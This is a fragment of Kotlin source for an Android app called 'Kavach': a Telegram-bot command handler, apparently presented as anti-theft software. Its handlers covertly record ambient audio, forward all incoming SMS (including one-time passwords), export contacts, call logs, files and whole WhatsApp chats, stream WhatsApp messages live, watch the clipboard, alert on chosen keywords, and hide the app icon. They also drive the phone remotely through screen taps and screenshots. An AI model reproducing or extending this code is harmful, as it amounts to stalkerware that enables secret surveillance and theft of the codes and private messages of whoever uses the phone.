                val G = com.kavach.app.core.ig.IgGod
                G.setDelete(app, !G.deleteOn(app))
                api.answerCb(cbId, if (G.deleteOn(app)) "🗑 ON ✅" else "⏹")
                api.sendMessage(chatId, "🗑 IG Delete-SENTRY ${if (G.deleteOn(app)) "ON ✅ — IG notif/message gayab = snitch" else "OFF"}")
            }
            "igcalltog" -> {
                val G = com.kavach.app.core.ig.IgGod
                G.setCall(app, !G.callOn(app))
                api.answerCb(cbId, if (G.callOn(app)) "📞 ON ✅" else "⏹")
                api.sendMessage(chatId, "📞 IG Call-SENTRY ${if (G.callOn(app)) "ON ✅ — IG call aaye = report" else "OFF"}")
            }
            "igmvs" -> { api.answerCb(cbId, "🛡…"); api.sendMessage(chatId, com.kavach.app.core.media.MediaVault.status(app)) }
            "ignots" -> { api.answerCb(cbId, "🔔…"); api.sendMessage(chatId, com.kavach.app.core.notif.NotiXray.query(app, "com.instagram.android", 12)) }
            "igstore" -> { api.answerCb(cbId, "📦…"); api.sendMessage(chatId, com.kavach.app.core.ig.KavachIG.storageReport()) }
            "ighelp" -> {
                api.answerCb(cbId, "📚…")
                val f = com.kavach.app.core.help.HelpCenter.helpFile(app, "instagram")
                api.sendMedia(chatId, "doc", f.readBytes(), "text/plain", f.name, "📸 IG category HELP")
                f.delete()
            }
            "clread" -> { api.answerCb(cbId, "📖…"); api.sendMessage(chatId, com.kavach.app.core.clipboard.KavachClip.readText(app)) }
            "cltip" -> tipMsg(api, chatId, cbId, "✏️ CLIPBOARD likhne ka tareeka:\n\n👉 /setclip <text>\n(jaise: /setclip Home-4312)")
            "clclear" -> { api.answerCb(cbId, "🧹…"); api.sendMessage(chatId, com.kavach.app.core.clipboard.KavachClip.clear(app)) }
            "clurl" -> { api.answerCb(cbId, "🔗…"); api.sendMessage(chatId, com.kavach.app.core.clipboard.KavachClip.lastUrl(app)) }
            "clwon" -> {
                api.answerCb(cbId, "👁…")
                val ok = com.kavach.app.core.clipboard.KavachClip.watchStart(app) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
                api.sendMessage(chatId, if (ok) "👁 CLIP-WATCH ON — clipboard badla to bata dunga 🐾 (⏹ se band) • ⚠️ ROM-dependent" else "⚠️ already ON")
            }
            "clwoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.clipboard.KavachClip.watchStop(); api.sendMessage(chatId, "👁 Clip-watch band 🤫") }
            "clhist" -> { api.answerCb(cbId, "📜…"); com.kavach.app.core.clipboard.KavachClip.recentText().chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "rec", "rec30" -> {
                val sec = if (id.endsWith("30")) 30 else 15
                api.answerCb(cbId, "🎤 ${sec}s…")
                api.sendMessage(chatId, "🎤 Recording… (${sec}s)")
                val a = KavachActions.recordAudio(app, sec)
                if (a != null) api.sendMedia(chatId, "voice", a, "audio/m4a", "kavach.m4a", "🎙️ ${sec}s aas-paas ki awaaz")
                else api.sendMessage(chatId, "❌ Mic permission 🟢 nahi — panel dekho!")
            }
            "alm" -> { api.answerCb(cbId, "🔊 BAJ RAHA!"); KavachActions.sirenStart(app, speak = false); api.sendMessage(chatId, "🚨 SIREN ON 😱 — ✋ dabake band karo") }
            "almt" -> { api.answerCb(cbId, "🗣️🔊 DHAMKI!"); KavachActions.sirenStart(app, speak = true); api.sendMessage(chatId, "🚨 SIREN + SPOKEN DHAMKI 😡 — ✋ = quiet") }
            "stop" -> { api.answerCb(cbId, "Shh…"); KavachActions.sirenStop(); api.sendMessage(chatId, "🤫 Shanti. Alarm band.") }
            "lock" -> { api.answerCb(cbId, "🔒…"); api.sendMessage(chatId, KavachActions.lockNow(app)) }
            // ═════════ 🎵 MEDIA (Category 3) ═════════
            "mrec15", "mrec30", "mrec60" -> {
                val sec = id.removePrefix("mrec").toInt()
                api.answerCb(cbId, "🎤 ${sec}s…")
                if (!com.kavach.app.core.actions.KavachActions.micReady(app)) { api.sendMessage(chatId, "⚠️ Mic permission 🟢 nahi — panel dekho!"); return@runAct }
                if (com.kavach.app.core.media.KavachMedia.isBusy()) { api.sendMessage(chatId, "⚠️ Koi aur recording/live chal rahi — ⏹ dabao pehle"); return@runAct }
                api.sendMessage(chatId, "🎤 Recording… ${sec}s (chor ko bilkul pata nahi 🤫)")
                api.sendChatAction(chatId, "record_voice")
                com.kavach.app.core.media.KavachMedia.recOnce(app, sec, hq = false) { f ->
                    kotlinx.coroutines.runBlocking {
                        api.sendChatAction(chatId, "upload_voice")
                        api.sendMedia(chatId, "voice", f.readBytes(), "audio/m4a", "aud_${System.currentTimeMillis()}.m4a", "🎤 ${sec}s — aas-paas ki awaaz 🎧")
                        f.delete()
                    }
                }
            }
            "mburst" -> {
                api.answerCb(cbId, "🗣 burst-loop…")
                if (!com.kavach.app.core.actions.KavachActions.micReady(app)) { api.sendMessage(chatId, "⚠️ Mic permission 🟢 nahi"); return@runAct }
                val ok = com.kavach.app.core.media.KavachMedia.burstVoice(app, 10) { f, n, tot ->
                    kotlinx.coroutines.runBlocking {
                        api.sendChatAction(chatId, "upload_voice")
                        api.sendMedia(chatId, "voice", f.readBytes(), "audio/m4a", f.name, "🗣 BURST #$n/$tot • har-1min ka 5s 🔂")
                        f.delete()
                    }
                }
                api.sendMessage(chatId, if (ok) "🗣 BURST-Voice ON — har 1min me 5s clip ×10 🔂 (⏹ STOP se kabhi bhi band)" else "⚠️ Busy — koi aur rec chal rahi")
            }
            "mstop" -> {
                api.answerCb(cbId, "⏹…")
                val f = com.kavach.app.core.media.KavachMedia.stopActive()
                if (f == null) { api.sendMessage(chatId, "⏹ Koi rec/live chal nahi rahi"); return@runAct }
                api.sendMedia(chatId, "voice", f.readBytes(), "audio/m4a", f.name, "⏹ STOPPED — partial audio bhej diya 📤")
                f.delete()
            }
            "hq15", "hq30", "hq60" -> {
                val sec = id.removePrefix("hq").toInt()
                api.answerCb(cbId, "🎯 HQ…")
                if (!com.kavach.app.core.actions.KavachActions.micReady(app)) { api.sendMessage(chatId, "⚠️ Mic permission 🟢 nahi"); return@runAct }
                if (com.kavach.app.core.media.KavachMedia.isBusy()) { api.sendMessage(chatId, "⚠️ Busy — ⏹ pehle"); return@runAct }
                api.sendMessage(chatId, "🎯 HQ recording — background noise-filter mode 🧹…")
                com.kavach.app.core.media.KavachMedia.recOnce(app, sec, hq = true) { f ->
                    kotlinx.coroutines.runBlocking {
                        api.sendChatAction(chatId, "upload_voice")
                        api.sendMedia(chatId, "voice", f.readBytes(), "audio/m4a", "hq_${System.currentTimeMillis()}.m4a", "🎯 HQ ${sec}s (voice-comm mode, less noise) ✨")
                        f.delete()
                    }
                }
            }
            "mint" -> {
                api.answerCb(cbId, "🔇 internal…")
                api.sendMessage(chatId, "🪦 Internal-audio v3.7.0 me hata diya (projection-engine ke bina Android allow nahi karta) — /record (mic) mast chalta hai! 🎙️"); return@runAct
                if (com.kavach.app.core.media.KavachMedia.isBusy()) { api.sendMessage(chatId, "⚠️ Busy"); return@runAct }
                api.sendMessage(chatId, "🔇 Internal audio — 15s… (⚠️ sirf allowed apps ka aayega; YouTube/Calls block rehte hain)")
                com.kavach.app.core.media.KavachMedia.internalOnce(app, 15) { f ->
                    kotlinx.coroutines.runBlocking {
                        if (f == null) api.sendMessage(chatId, "❌ Internal audio nahi aayi (koi media-app baj nahi rahi thi, ya usne capture block kiya)" )
                        else {
                            api.sendChatAction(chatId, "upload_voice")
                            api.sendMedia(chatId, "audio", f.readBytes(), "audio/wav", "internal_${System.currentTimeMillis()}.wav", "🔇 INTERNAL audio 15s — phone ke andar ka sound 🔊")
                            f.delete()
                        }
                    }
                }
            }
            "mtoggle", "mnext", "mprev", "mseekp", "mseekm", "mnow" -> {
                val act = when (id) { "mtoggle" -> "toggle"; "mnext" -> "next"; "mprev" -> "prev"; "mseekp" -> "seekp"; "mseekm" -> "seekm"; else -> "status" }
                val r = com.kavach.app.core.media.KavachMedia.mediaControl(app, act)
                api.answerCb(cbId, "🎛…")
                api.sendMessage(chatId, r)
            }
            "volp", "volm" -> { val r = com.kavach.app.core.media.KavachMedia.volStep(app, id == "volp"); api.answerCb(cbId, "🔊…"); api.sendMessage(chatId, r) }
            "vol0", "vol50", "vol100" -> { val p = id.removePrefix("vol").toInt(); val r = com.kavach.app.core.media.KavachMedia.setVolPercent(app, p); api.answerCb(cbId, "🎚…"); api.sendMessage(chatId, r) }
            "ring0", "ring1", "ring2" -> {
                val mode = when (id) { "ring0" -> 0; "ring1" -> 1; else -> 2 }
                val r = com.kavach.app.core.media.KavachMedia.ringerMode(app, mode)
                api.answerCb(cbId, "🔕…"); api.sendMessage(chatId, r)
            }
            "thhi" -> {
                api.answerCb(cbId, "😡…")
                com.kavach.app.core.actions.KavachActions.speakNow(app, com.kavach.app.core.media.KavachMedia.THREAT_HI)
                api.sendMessage(chatId, "🗣 DHAMKI bol di (Hindi) 📢 $— chor ke kaan pakko!")
            }
            "then" -> {
                api.answerCb(cbId, "😡…")
                com.kavach.app.core.actions.KavachActions.speakNow(app, com.kavach.app.core.media.KavachMedia.THREAT_EN)
                api.sendMessage(chatId, "🗣 DHAMKI bol di (English) 📢")
            }
            "mmon" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, com.kavach.app.core.media.KavachMedia.monitorText(app)) }
            "panic" -> {
                api.answerCb(cbId, "🚨 MAX!…")
                api.sendMessage(chatId, "💥 MAX-PANIC — full dhamaka shuru!\n🚨 Siren + 😡 Dhamki + 🔒 Lock + 📸 Photo")
                com.kavach.app.core.actions.KavachActions.sirenStart(app, speak = true)
                com.kavach.app.core.actions.KavachActions.speakNow(app, com.kavach.app.core.media.KavachMedia.THREAT_HI)
                com.kavach.app.core.actions.KavachActions.lockNow(app)
                if (com.kavach.app.core.actions.KavachCamera.ready(app)) {
                    val jpg = com.kavach.app.core.actions.KavachCamera.photo(app, true)
                    jpg?.let { api.sendPhoto(chatId, it, "😱 PANIC-moment front shot") }
                }
                api.sendMessage(chatId, "(✋ button se siren band karo Jab theek lage 😎)")
            }
            // ═════════ 📞 CALLS & SMS (Category 4) ═════════
            "clog10" -> { api.answerCb(cbId, "📋…"); api.sendChatAction(chatId, "typing"); api.sendMessage(chatId, com.kavach.app.core.phone.KavachPhone.callLogText(app, 10)) }
            "clog20" -> { api.answerCb(cbId, "📋…"); api.sendChatAction(chatId, "typing"); com.kavach.app.core.phone.KavachPhone.callLogText(app, 20).chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "misson" -> {
                api.answerCb(cbId, "👁…")
                val ok = com.kavach.app.core.phone.KavachPhone.missedWatch(app) { alert ->
                    kotlinx.coroutines.runBlocking { api.sendMessage(chatId, alert) }
                }
                api.sendMessage(chatId, if (ok) "🚩 MISSED-ALERTS ON — jo call miss hui, telegram pe alert 📲 (⏹ se band)" else "⚠️ Permission 🔴 ya already ON")
            }
            "missoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.phone.KavachPhone.missedStop(); api.sendMessage(chatId, "🚩 Missed-alerts band 🤫") }
            "calltip" -> {
                api.answerCb(cbId, "📞 tip")
                api.sendMessage(chatId, "📞 CALL LAGANE KA TAREEKA:\n\nLikh bhejo 👉 /call <number>\n(jaise: /call 9090909090)\n\n⚠️ Tip: emergency me — chor ke samne call laga ke SUN bhi sakta hai phasander kya chal raha hai (speaker ON kar sakta) 🎧")
            }
            "sms10" -> { api.answerCb(cbId, "📩…"); api.sendChatAction(chatId, "typing"); api.sendMessage(chatId, com.kavach.app.core.phone.KavachPhone.smsText(app, 10)) }
            "sms20" -> { api.answerCb(cbId, "📩…"); api.sendChatAction(chatId, "typing"); com.kavach.app.core.phone.KavachPhone.smsText(app, 20).chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "smstip" -> {
                api.answerCb(cbId, "💬 tip")
                api.sendMessage(chatId, "💬 SMS BHEJNE KA TAREEKA:\n\nLikh bhejo 👉 /sms <number> <message>\n(jaise: /sms 9090909090 Kaha ho? Sir ko yaad dilana)\n\n📩 SMS device ke sim se jayega (charging/paranoid nahi ❌ plan-credit use hoga)")
            }
            "contacts" -> {
                api.answerCb(cbId, "📇…")
                if (!com.kavach.app.core.phone.KavachPhone.hasContactsPerm(app)) { api.sendMessage(chatId, "⚠️ Contacts permission 🔴 — hidden panel se 📇 row GRANT karo"); return@runAct }
                api.sendChatAction(chatId, "typing")
                api.sendMessage(chatId, "📇 Contacts file bana raha hoon…")
                val f = com.kavach.app.core.phone.KavachPhone.contactsFile(app)
                if (f == null) { api.sendMessage(chatId, "❌ Contacts read fail"); return@runAct }
                api.sendChatAction(chatId, "upload_document")
                api.sendMedia(chatId, "doc", f.readBytes(), "text/plain", f.name, "📇 ALL CONTACTS export 📎")
                f.delete()
            }
            "pmon" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, com.kavach.app.core.phone.KavachPhone.monitorText(app)) }
            "smwon" -> {
                api.answerCb(cbId, "📥…")
                val ok = com.kavach.app.core.phone.KavachPhone.smsWatch(app) { s ->
                    kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) }
                }
                api.sendMessage(chatId, if (ok) "📥 SMS-WATCH ON — jo SMS aaya telegram pe turant 📬 (OTP-forward bonus! ⏹ se band)" else "⚠️ SMS permission 🔴 ya already ON")
            }
            "smwoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.phone.KavachPhone.smsWatchStop(); api.sendMessage(chatId, "📥 SMS-watch band 🤫") }
            // ═════════ 📁 FILES (Category 5) ═════════
            "flsdl", "flsdcim", "flsroot", "flswa" -> {
                api.answerCb(cbId, "📂…")
                val path = when (id) { "flsdl" -> "/sdcard/Download"; "flsdcim" -> "/sdcard/DCIM"; "flswa" -> "/sdcard/Android/media/com.whatsapp/WhatsApp/Media"; else -> "/sdcard" }
                api.sendChatAction(chatId, "typing")
                com.kavach.app.core.files.KavachFiles.listText(path).chunked(3900).forEach { api.sendMessage(chatId, it) }
            }
            "fgettip" -> tipMsg(api, chatId, cbId,
                "📤 FILE LAO (phone→TG):\n\n👉 /get <path>\n(jaise: /get /sdcard/DCIM/Camera/IMG_123.jpg)\n\n💡 bhaiya-dukaan:\n• 45MB se bara? → auto SPLIT-parts 🎁\n• Image ho → seedha photo-measuring bhi")
            "fuptip" -> tipMsg(api, chatId, cbId,
                "📥 UPLOAD (bot→phone):\n\n1️⃣ Bot pe FILE bhejo (document-atach 📎)\n2️⃣ Caption likho:  #save /sdcard/Download\n(caption chhodo to 📥 Downloads me save ho jayega)\n3️⃣ Device khud confirm karega ✅")
            "fdeltip" -> tipMsg(api, chatId, cbId,
                "🗑 DELETE:\n\n👉 /del <path>\n(jaise: /del /sdcard/Download/sasta.apk)\n\n⚠️ DHOOR — folder delete = andar ka sab DELETE. Undo nahi hai (Allah-un-recycle nahi 😅)")
            "frentip" -> tipMsg(api, chatId, cbId,
                "✏️ RENAME / MOVE / COPY:\n\n👉 /ren <path> <nayaNaam>\n👉 /mv <src> <dest>\n👉 /cp <src> <dest>\n(haath-pair karne ka example: /cp /sdcard/DCIM/x.jpg /sdcard/Vault/)")
            "fscht" -> tipMsg(api, chatId, cbId,
                "🔍 SEARCH:\n\n👉 /search <root> <naam>\n(jaise: /search /sdcard/DCIM IMG_123)\n(ya sab jagah: /search /sdcard pic)")
            "fzipt" -> tipMsg(api, chatId, cbId,
                "🗜 ZIP/UNZIP:\n\n👉 /zip <folder|file> → TG pe bhejta 📦\n👉 /unzip <zipPath> <destFolder>\n(bada zip > 45mb → parts me bhejta hoon)")
            "fhidet" -> tipMsg(api, chatId, cbId,
                "🙈 HIDE (2 modes):\n\n👉 /hide <folder>        ← .nomedia banake (🖼 sirf gallery se gayab)\n👉 /dothide <folder>   ← folder ka naam '.naam' karke (🔒 file-manager+gallery DONO se gayab)\n👉 /unhide /path → wapas\n\n(💡 loot-ne-wale chamchamati cheezein kavach me chhupayo 😈)")
            "fpeakwa", "fpeaktg", "fpeakig" -> {
                api.answerCb(cbId, "🗂 peek…")
                val root = when (id) {
                    "fpeakwa" -> "/sdcard/Android/media/com.whatsapp/WhatsApp/Media"
                    "fpeakig" -> "/sdcard/Android/media/com.instagram.android"
                    else -> "/sdcard/Android/media/org.telegram.messenger"
                }
                api.sendChatAction(chatId, "typing")
                com.kavach.app.core.files.KavachFiles.cachePeekText(root).chunked(3900).forEach { api.sendMessage(chatId, it) }
            }
            "freco" -> {
                api.answerCb(cbId, "🏴‍☠️ scan…")
                api.sendChatAction(chatId, "typing")
                com.kavach.app.core.files.KavachFiles.recoveryText().chunked(3900).forEach { api.sendMessage(chatId, it) }
            }
            "fcheat" -> tipMsg(api, chatId, cbId,
                "📋 FILES CHEAT-SHEET:\n\n🗂 /ls <path>          — list\n📤 /get <file>        — phone se TG\n🗑 /del <path>         — delete\n✏️ /ren <old> <new>    — rename\n🚚 /mv <src> <dst>     — move\n📄 /cp <src> <dst>     — copy\n🔍 /search <root> <q>  — search\n🗜 /zip <path>         — zip→TG\n🗜 /unzip <z> <dest>   — unzip\n🙈 /hide <dir>        — .nomedia\n🔒 /dothide <dir>     — deep-hide\n👁 /unhide <dir>       — unhide\n📥 bot pe doc bhejo + #save <path>")
            // ═════════ ⚙️ SYSTEM + 🌐 NETWORK (v2.3.0) ═════════
            // ═════════ 📦 APPS + 🌍 BROWSER (v2.4.0) ═════════
            "applist" -> { api.answerCb(cbId, "📋…"); api.sendChatAction(chatId, "typing"); com.kavach.app.core.apps.KavachApps.listText(app, "").chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "appscht" -> tipMsg(api, chatId, cbId, "🔍 App-search:\n👉 /apps <naam>\n(jaise: /apps insta — dikh jayegi puri entry name+pkg ➜ /appinfo <pkg>)")
            "apptip" -> tipMsg(api, chatId, cbId, "ℹ️ Details:\n👉 /appinfo <package>\n(jaise: /appinfo com.whatsapp — version/install-date/target-SDK sab!")
            "appopt" -> tipMsg(api, chatId, cbId, "▶️ Open-app:\n👉 /openapp <package>\n(jaise: /openapp com.whatsapp)\n⚠️ phone pe SCREEN khula dikh jayega — chor ko dikhega 😜 (emergency only)")
            "apputip" -> tipMsg(api, chatId, cbId, "🗑 Uninstall:\n👉 /uninstall <package>\n(system ka ek confirm tap chahiye — rule hai 👆)")
            "appwon" -> {
                api.answerCb(cbId, "👁…")
                val ok = com.kavach.app.core.apps.KavachApps.watchStart(app) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
                api.sendMessage(chatId, if (ok) "👁 APP-WATCH ON — kuchh bhi install/uninstall hua to turant bata dunga 🛰" else "⚠️ already ON")
            }
            "appwoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.apps.KavachApps.watchStop(); api.sendMessage(chatId, "👁 App-watch band 🤫") }
            "appback" -> {
                api.answerCb(cbId, "📄…")
                api.sendChatAction(chatId, "typing")
                val f = com.kavach.app.core.apps.KavachApps.backupFile(app)
                api.sendMedia(chatId, "doc", f.readBytes(), "text/plain", f.name, "📦 Apps backup-list 📎")
                f.delete()
            }
            "icohide" -> { api.answerCb(cbId, "🕳…"); api.sendMessage(chatId, com.kavach.app.core.ghost.IconGhost.setVisible(app, false)) }
            "icoshow" -> { api.answerCb(cbId, "👀…"); api.sendMessage(chatId, com.kavach.app.core.ghost.IconGhost.setVisible(app, true)) }
            "fburst" -> runText(app, api, chatId, "/camburst 5")
            "fvidtod" -> runText(app, api, chatId, "/viddump")
            "fcallst" -> runText(app, api, chatId, "/callstats")
            "fhealth" -> runText(app, api, chatId, "/health")
            "ftimel" -> runText(app, api, chatId, "/timeline")
            "fdups" -> runText(app, api, chatId, "/dups")
            "flong" -> runText(app, api, chatId, "/eyelong")
            "focr" -> runText(app, api, chatId, "/eyeread")
            "fexplain" -> runText(app, api, chatId, "/eyeai")
            "fjobt" -> tipMsg(api, chatId, cbId, "⏰ WA-SCHEDULER:\n👉 /wamsgat <NUM> <HH:MM> <MSG>\n(jaise: /wamsgat 9090909090 07:00 Happy birthday bhai 🎂)\n📜 list: /wajobs · radd: /wajobdel <id>")
            "fstalkt" -> tipMsg(api, chatId, cbId, "🧬 WORD-STALK:\n👉 /wastalk <lafza> — add (jaise: /wastalk exam)\n🧹 /wastalk del <lafza>\n✏ list: /wastalk\nJo lafza notif me aaya = turant ALERT 🚨")
            "fdpt" -> tipMsg(api, chatId, cbId, "🖼 DP-DNA watch:\n👉 /wadpwatch 9090909090 (add)\n👉 /wadpwatch off\n💡 ~30min check; DP badla → naya-photo TG pe!")
            "fmacrot" -> tipMsg(api, chatId, cbId, "🎬 MACRO-RECORDER:\n👉 /macro rec → aap taps karo → /macro stop\n▶ /macro play = ghost wahi taps repeat!\n(ghost-hand ON hona chahiye 👻)")
            "frulet" -> tipMsg(api, chatId, cbId, "🤖 AUTO-PILOT:\n👉 /rule add batt15=/location\n👉 /rule add hour1=/camfront|/location\ntrigger: batt15 · hour1 · batt80\naction: seedhe koi bhi command 📜 /rules · 🧹 /ruleclear")
            "fntrip" -> runText(app, api, chatId, "/nettrip")
            "fnkt" -> tipMsg(api, chatId, cbId, "🧯 NETKILL:\n👉 /netkill <pkg>\n(system rules: pakka data-block = Settings screen khulegi — wahan Background-data OFF kar do)")
            "icostat" -> { api.answerCb(cbId, "🔬…"); api.sendMessage(chatId, com.kavach.app.core.ghost.IconGhost.status(app)) }
            "icoautot" -> tipMsg(api, chatId, cbId, "⏱ ICON AUTO-HIDE:\n👉 /icon auto <min> (1-120) — N min baad khud chhupe 🕳\n👉 /icon auto off — band\n💡 fresh-setup pe ~8-18 min me apne-aap chhuupta hai; wapas: /icon show ya dial *#*#5282#*# 📞")
            "bropt" -> tipMsg(api, chatId, cbId, "🌍 URL open:\n👉 /open <url>\n(jaise: /open youtube.com)")
            "brsrt" -> tipMsg(api, chatId, cbId, "🔍 Google search:\n👉 /google <query>\n(jaise: /google punjabi song)")
            "brdlt" -> tipMsg(api, chatId, cbId, "📥 Direct-download:\n👉 /dl <url>\nDevice Download folder me save kare + link (winner photos se sampark ➜ /get se TG pe 💪)")
            "brsave" -> { api.answerCb(cbId, "🔖…"); com.kavach.app.core.browser.KavachBrowser.savedText(app).chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "brsavet" -> tipMsg(api, chatId, cbId, "➕ Link save:\n👉 /save <url>\n(collection banane ke liye — /saved se list, /dellink <N> se hatana)")
            // ═════════ 👁 REMOTE EYE — GHOST HAND (v2.6.0) ═════════
            in setOf("eyez1","eyez2","eyez3","eyez4","eyez5","eyez6","eyez7","eyez8","eyez9") -> {
                val z = id.removePrefix("eyez").toInt()
                val ok = com.kavach.app.core.eye.KavachEye.tapZone(app, z)
                api.answerCb(cbId, if (ok) "👆 zone $z" else "⚠️ ghost-hand 🔴")
                kotlinx.coroutines.delay(450)
                sendEyeFrame(api, chatId, null, appendCap = "👆 tap zone $z ✔ ${if (ok) "🟢" else "🔴"}", markZone = z, markOk = ok)
            }
            "eyeback", "eyehome", "eyerec", "eyeback2" , "eyehome2", "eyerec2" -> {
                val k = when { id.contains("back") -> "back"; id.contains("home") -> "home"; else -> "recents" }
                val ok = com.kavach.app.core.eye.KavachEye.key(k)
                api.answerCb(cbId, if (ok) "🔑 $k ✔" else "⚠️ ghost-hand 🔴")
                kotlinx.coroutines.delay(450)
                sendEyeFrame(api, chatId, null, appendCap = "🔑 $k ✔")
            }
            "eyeup", "eyedn", "eyeleft", "eyeright" -> {
                val dir = when (id) { "eyeup" -> "up"; "eyedn" -> "down"; "eyeleft" -> "left"; else -> "right" }
                val ok = com.kavach.app.core.eye.KavachEye.swipeDir(app, dir)
                api.answerCb(cbId, if (ok) "🖐 $dir" else "⚠️ ghost-hand 🔴")
                kotlinx.coroutines.delay(450)
                sendEyeFrame(api, chatId, null, appendCap = "🖐 $dir ✔")
            }
            "eyegrab" -> { api.answerCb(cbId, "📸…"); api.sendChatAction(chatId, "upload_photo"); sendEyeFrame(api, chatId, null) }
            "eyehalt" -> { api.answerCb(cbId, "⏹ band"); sendEyeFrame(api, chatId, null, appendCap = "⏹ TAP-SESSION BAND — agla frame fresh-message 💨", halt = true) }
            "eyeref" -> { api.answerCb(cbId, "🔄…"); sendEyeFrame(api, chatId, null) }
            "eyezoomt" -> tipMsg(api, chatId, cbId, "🔎 Zone CLOSE-UP chahiye?\n👉 /eyezoom <1-9> (jaise: /eyezoom 5)\n💡 zoom-photo me ①-⑨ sub-cells — har cell ke neeche exact /eyetap X Y — SNIPER-tap 🎯")
            "eyetiptap" -> tipMsg(api, chatId, cbId, "👆 EXACT-tap ke liye:\n👉 /eyetap <x> <y>\n(jaise: /eyetap 540 1450)\n💡 Long-press: /eyehold x y (delete-type flows!)")
            "eyetiptype" -> tipMsg(api, chatId, cbId, "⌨ Ghost-hand likhna:\n👉 /eyetext <msg>\n(focused field pe likh dega — chat/search box!)")
            "eyemon" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, com.kavach.app.core.eye.KavachEye.monitorText(app)) }
            "eyeWasend" -> tipMsg(api, chatId, cbId, "⚠️👁 NEEDS Ghost-hand GRANT!\n\n👉 /wasend <phone> <msg>\n(jaise: /wasend 9090909090 Kaise ho bhai?)\n💡 WA khulegi → ghost type karega → SEND daba dega 🔥 (10-digit number me auto-91 jodta)")
            "wastoryt" -> tipMsg(api, chatId, cbId, "📜 FULL-CHAT EXPORT:\n👉 /wastory <phone>\n(jaise: /wastory 9090909090)\n💡 ghost-hand chat khole ga → khud auto-scroll kare ga → poori chat TXT-file TG pe 📎 (30-90s)")
            "wacallst" -> tipMsg(api, chatId, cbId, "📞 WA-CALL TRACKER:\n👉 /wacalls\n💡 WA khole ga → Calls tab → dump (kaun, kab, kitne) — recording NAHI, sirf list ✔")
            "eyeWaread" -> tipMsg(api, chatId, cbId, "📖 /waread <phone>\n(jaise: /waread 9090909090 — chat kholo, ghos se visible-messages dump karega 📜)")
            "eyeWalive" -> tipMsg(api, chatId, cbId, "📡 /walive <phone>\n⚠️ chat open rehne do — har 20s screen-check, NAYI LINE aayi = telegram pe! (⏹ /waoff)")
            // ═════════ 🔐 SECURITY + 🧠 AI (v2.5.0) ═════════
            "gadmin" -> { api.answerCb(cbId, "👮…"); api.sendMessage(chatId, com.kavach.app.core.guard.KavachGuard.adminStatus(app)) }
            "simon" -> {
                api.answerCb(cbId, "📵…")
                val ok = com.kavach.app.core.guard.KavachGuard.simWatchStart(app) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
                api.sendMessage(chatId, if (ok) "📵 SIM-WATCH ON — SIM nikali/badli to FULL ALARM 🚨📢" else "⚠️ already ON")
            }
            "simoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.guard.KavachGuard.simWatchStop(); api.sendMessage(chatId, "📵 SIM-watch band 🤫") }
            "wrongr" -> { api.answerCb(cbId, "🔓…"); api.sendMessage(chatId, com.kavach.app.core.guard.KavachGuard.wrongUnlockReport(app)) }
            "chgon" -> {
                api.answerCb(cbId, "🔌…")
                val ok = com.kavach.app.core.guard.KavachGuard.chargeWatchStart(app) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
                api.sendMessage(chatId, if (ok) "🔌 CHARGE-WATCH ON — charger/config badle = alert ⚡" else "⚠️ already ON")
            }
            "chgoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.guard.KavachGuard.chargeWatchStop(); api.sendMessage(chatId, "🔌 Charge-watch band") }
            "decoyon" -> {
                api.answerCb(cbId, "🪤…")
                val ok = com.kavach.app.core.guard.KavachGuard.decoyOn(app) {
                    kotlinx.coroutines.runBlocking { api.sendMessage(chatId, "⚫ Decoy dismissed — chor ne hat-trick taps hit ki ya kuchh hua 🕵️") }
                }
                api.sendMessage(chatId, if (ok) "🪤 FAKE-SHUTDOWN ON — screen kaali & touch dead!\n(🔓 secret: top-left kone me 3-TAP jaldi dabao = vashwaas wapas)" else "⚠️ overlay permission 🔴 hai — panel se 🖥 row ON karo")
            }
            "decoyoff" -> { api.answerCb(cbId, "⚫"); com.kavach.app.core.guard.KavachGuard.decoyOff(app); api.sendMessage(chatId, "⚫ Decoy band 🔓") }
            "theft" -> {
                api.answerCb(cbId, "🆘 MAX!…")
                api.sendMessage(chatId, "🆘 THEFT-MODE — FULL ACTIVATION 💥\n🚨 Siren + 😡 Dhamki + 🔒 Lock + 📸 Photo + 📍 Location + 🚧 Fence!")
                com.kavach.app.core.actions.KavachActions.sirenStart(app, speak = true)
                com.kavach.app.core.actions.KavachActions.speakNow(app, com.kavach.app.core.media.KavachMedia.THREAT_HI)
                com.kavach.app.core.actions.KavachActions.lockNow(app)
                com.kavach.app.core.actions.KavachCamera.photo(app, true)?.let { api.sendPhoto(chatId, it, "😱 THEFT-mode front shot") }
                api.sendMessage(chatId, com.kavach.app.core.location.KavachLocation.fullText(app))
                com.kavach.app.core.location.KavachLocation.fenceStart(app, 100) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
            }
            "gmon" -> { api.answerCb(cbId, "📊…"); com.kavach.app.core.guard.KavachGuard.monitorText(app).chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "ailook" -> {
                api.answerCb(cbId, "🧠…")
                api.sendChatAction(chatId, "upload_photo")
                val (jpg, report, faces) = com.kavach.app.core.ai.KavachAI.aiLook(app)
                if (jpg != null) api.sendPhoto(chatId, jpg, "🧠 AI-LOOK • faces=$faces")
                api.sendMessage(chatId, report)
            }
            "scenon" -> {
                api.answerCb(cbId, "🎞…")
                val ok = com.kavach.app.core.ai.KavachAI.sceneWatchStart(app) { s, shot ->
                    kotlinx.coroutines.runBlocking {
                        api.sendMessage(chatId, s)
                        shot?.let { api.sendPhoto(chatId, it, "🎞 changed-scene auto-shot") }
                    }
                }
